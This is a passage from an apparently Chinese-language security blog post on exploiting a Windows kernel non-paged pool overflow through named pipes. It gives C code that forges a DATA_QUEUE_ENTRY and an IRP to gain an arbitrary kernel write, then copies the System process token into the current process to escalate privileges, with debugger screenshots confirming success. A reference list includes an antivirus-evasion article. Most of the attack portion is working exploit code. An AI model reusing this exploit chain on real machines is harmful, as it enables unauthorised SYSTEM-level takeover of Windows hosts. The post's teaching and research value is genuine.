class="type">char</span>*)&amp;current_process_id);</span><br><span class="line">    <span class="keyword">if</span> (current_process_id != GetCurrentProcessId())</span><br><span class="line">        g_setoff++;</span><br><span class="line"></span><br><span class="line">    current_process = cp_thread_list_head - c_offsets[g_setoff][EPROCESS_THREADLISTHEAD];</span><br><span class="line"></span><br><span class="line">    system_process = GetProcessById(current_process, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Found current process: %p system process: %p\n&quot;</span>, current_process, system_process);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="任意地址写实现"><a class="markdownIt-Anchor" href="#任意地址写实现"></a> 任意地址写实现</h2>
<p>​	根据前文的描述，当客户端<strong>读取</strong>服务端发送的消息时，利用甚于配额分配机制，<code>Quota&lt;Datasize</code>，就会触发对应dqe的Irp，将<code>irp-&gt;AssociatedIrp</code>的值写入到<code>irp-&gt;UserBuffer</code>中。那么我们可以伪造Irp，然后执行<code>ReadFile</code>触发Irp。但是Irp对于系统来说十分的严格，[1]中利用了任意读复制一个合法的Irp，然后改造。原文提醒：</p>
<blockquote>
<p>务必使用非缓冲条目来保存伪造的 IRP，因为它很可能会在 IofCompleteRequest 调用结束时被释放</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">DATA_QUEUE_ENTRY:</span><br><span class="line"> NextEntry.Flink=可访问的合法地址;</span><br><span class="line"> Irp=特殊伪造的irp;</span><br><span class="line"> SecurityContext=0;</span><br><span class="line"> EntryType=0;</span><br><span class="line"> QuotaInEntry=DataSize-1;</span><br><span class="line"> DataSize=任意地址写的大小;</span><br><span class="line"> x=无所谓;</span><br><span class="line"> </span><br><span class="line">Forged IRP:</span><br><span class="line"> Flags=Flags&amp;~IRP_DEALLOCATE_BUFFER|IRP_BUFFERED_IO|IRP_INPUT_OPERATION;</span><br><span class="line"> AssociatedIrp=源地址;</span><br><span class="line"> UserBuffer=目的地址;</span><br><span class="line"> ThreadListEntry.Flink-&gt;Blink==ThreadListEntry.Blink-&gt;Flink==&amp;ForgedIRPAddr-&gt;ThreadListEntry;</span><br></pre></td></tr></table></figure>
<p>​	相关代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PrepareWriteIRP</span><span class="params">(IRP* irp, PVOID thread_list, PVOID source_address, PVOID destination_address)</span> &#123;</span><br><span class="line">    irp-&gt;Flags |= IRP_BUFFERED_IO | IRP_INPUT_OPERATION;</span><br><span class="line">    irp-&gt;AssociatedIrp = source_address;</span><br><span class="line">    irp-&gt;UserBuffer = destination_address;</span><br><span class="line">    irp-&gt;ThreadListEntry.Flink = (LIST_ENTRY*)(thread_list);</span><br><span class="line">    irp-&gt;ThreadListEntry.Blink = (LIST_ENTRY*)(thread_list);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">     <span class="type">uint64_t</span> thread_list[<span class="number">2</span>];</span><br><span class="line"> PrepareWriteIRP(irp, thread_list, (PVOID)(system_process + c_offsets[g_setoff][EPROCESS_TOKEN]), (PVOID)(current_process + c_offsets[g_setoff][EPROCESS_TOKEN]));</span><br><span class="line">    NtFsControlFile(g_victim_pipe-&gt;Write, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, &amp;isb, <span class="number">0x119FF8</span>, irp, <span class="number">0x1000</span>, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">//创建unbuffered存放伪造的Irp</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​	回忆前文<a href="##%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93%E4%BB%8B%E7%BB%8D">命名管道介绍</a>中的描述：</p>
<blockquote>
<p><code>unbuffered</code>: <code>EntryType=1</code>，<strong><code>DATA_QUEUE_ENTRY</code> 中申请的<code>buf</code>大小只存放<code>DATA_QUEUE_ENTRY</code></strong>，读取时要调用<code>IRP</code>来实现读取。</p>
</blockquote>
<p>​	那么对<code>PrepareWriteIRP</code>函数生成的Irp这块内存的读写都要通过<code>unbuffered-&gt;Irp</code>进行</p>
<img src="D:\Blog\github\source\_posts\win-exp-big-non-paged-pool-overflow.assets\image-20250415155606850.png" alt="image-20250415155606850" style="zoom:80%;" />
<img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250415155735870.png" alt="image-20250415155735870" style="zoom:80%;" />
<p>​	如果Irp执行就是从<code>0xffffe20fa485e4f8</code>的值复制到<code>0xffffe20faab3b538</code>，并且<code>0xffffe20fa485e4f8</code>的值就为Token的值</p>
<p>​	然后设置<code>qde-&gt;Irp</code>后触发</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PrepareDataEntryForWrite</span><span class="params">(DATA_QUEUE_ENTRY* dqe, IRP* irp, <span class="type">uint32_t</span> size)</span> &#123;</span><br><span class="line">    <span class="built_in">memset</span>(dqe, <span class="number">0</span>, <span class="keyword">sizeof</span>(DATA_QUEUE_ENTRY));</span><br><span class="line">    dqe-&gt;Flink = (<span class="type">uint64_t</span>)dqe;</span><br><span class="line">    dqe-&gt;EntryType = <span class="number">0</span>;</span><br><span class="line">    dqe-&gt;DataSize = size;</span><br><span class="line">    dqe-&gt;Irp = irp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    dqe = (DATA_QUEUE_ENTRY*)USER_DATA_ENTRY_ADDR;</span><br><span class="line">    PrepareDataEntryForWrite(dqe, (IRP*)forged_irp_addr, ARBITRARY_WRITE_SIZE);</span><br><span class="line"></span><br><span class="line">    thread_list[<span class="number">0</span>] = thread_list[<span class="number">1</span>] = forged_irp_addr + offsetof(IRP, ThreadListEntry.Flink);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Triggering a call to IofCompleteRequest with our forged IRP and overwriting our token\n\n&quot;</span>);</span><br><span class="line">    ReadFile(g_victim_pipe-&gt;Read, buf, ARBITRARY_WRITE_SIZE, &amp;res, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//...    </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​	<code>ReadFile</code>时，依旧会从AAAA开始读取8字节，同时<code>AAAA-&gt;quota-=8</code></p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250415151904648.png" alt="image-20250415151904648" /></p>
<p>​	之后会调整队列中dqe的quota大小，正常来说对于我们伪造的dqe的<code>quota&lt;size</code>的，这个时候就会调用Irp，然后<code>quota+=8</code>；但是我们修改了<code>CCCC-&gt;flink=DDDD</code>，即指向<code>0xfd000000000</code>，并且我们在DDDD中伪造了Irp，那么就会调用该Irp。</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250415152714453.png" alt="image-20250415152714453" /></p>
<p>​	最后成功复制token完成提权</p>
<img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250415143758994.png" alt="image-20250415143758994" style="zoom:80%;" />
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250415144332735.png" alt="image-20250415144332735" /></p>
<h1 id="引用"><a class="markdownIt-Anchor" href="#引用"></a> 引用</h1>
<p>[1] <a target="_blank" rel="noopener" href="https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation">Windows-Non-Paged-Pool-Overflow-Exploitation</a> <a target="_blank" rel="noopener" href="https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation">https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation</a></p>
<p>[2] <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/9ReEchLx1dTbWR9plRWbpg">【免杀】使用CobaltStrike的外置监听器绕过检测</a> <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/9ReEchLx1dTbWR9plRWbpg">https://mp.weixin.qq.com/s/9ReEchLx1dTbWR9plRWbpg</a></p>
<p>[3] <a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12806">从零探索现代windows内核栈溢出-以HEVD练习为例（上）</a><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12806">https://xz.aliyun.com/news/12806</a></p>
<p>[4] <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp">IRP 结构 （wdm.h）</a> <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp</a></p>
<p>[5] <a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12808">从零探索现代windows内核栈溢出-以HEVD练习为例（下）</a> <a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12808">https://xz.aliyun.com/news/12808</a></p>
</div></article><div class="pagination"><a class="pagination__link pagination__prev" href="/2098/12/31/cpp-constructor/">prev_post</a><a class="pagination__link pagination__next" href="/2025/04/05/local-deepseek-MCP/">next_post</a></div></main><footer class="footer metadata"><p class="footer__text">© 2025 Joe1sn</p><p class="footer__text">Powered by <a class="footer__text__link" href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a class="footer__text__link" href="https://pages.github.com/" target="_blank">Github Page</a></p></footer></div></body></html>